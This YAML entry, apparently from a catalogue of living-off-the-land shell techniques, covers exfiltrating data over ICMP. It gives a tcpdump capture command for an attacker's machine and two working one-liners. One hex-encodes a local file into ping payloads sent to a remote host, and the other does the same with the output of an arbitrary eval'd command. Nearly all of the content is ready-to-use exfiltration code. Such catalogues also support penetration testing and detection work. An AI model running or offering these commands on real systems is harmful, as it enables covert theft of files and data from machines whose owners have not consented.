---
functions:
  data-exfiltration:
    - description: |
        Capture ICMP packets embedded in ping requests.
        Run `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` on the attacker box to collect the data.             
        ⚠️ Increase the timeout flag based on the amount of data.                             
        ⚠️ Manual parsing or reconstruction is required.  
        
        Send local file content over ICMP using hex-encoded payloads.
      code: |
        xxd -p < $LFILE$ | while read -r line; do i=0; while [ $i -lt ${#line} ];
        do chunk=${line:$i:16}; [ -z "$chunk" ] && break; padded=$(printf "%-16s" "$chunk");
        padded=${padded// /0}; ping -c 1 -p "$padded" $RHOST$; i=$((i + 16)); done; done
    - description: Send command output over ICMP using hex-encoded payloads.
      code: |
        eval "$CMD" | xxd -p | while read -r line; do i=0; while [ $i -lt ${#line} ];
        do chunk=${line:$i:16}; [ -z "$chunk" ] && break; padded=$(printf "%-16s" "$chunk");
        padded=${padded// /0}; ping -c 1 -p "$padded" $RHOST$; i=$((i + 16)); done; done
---
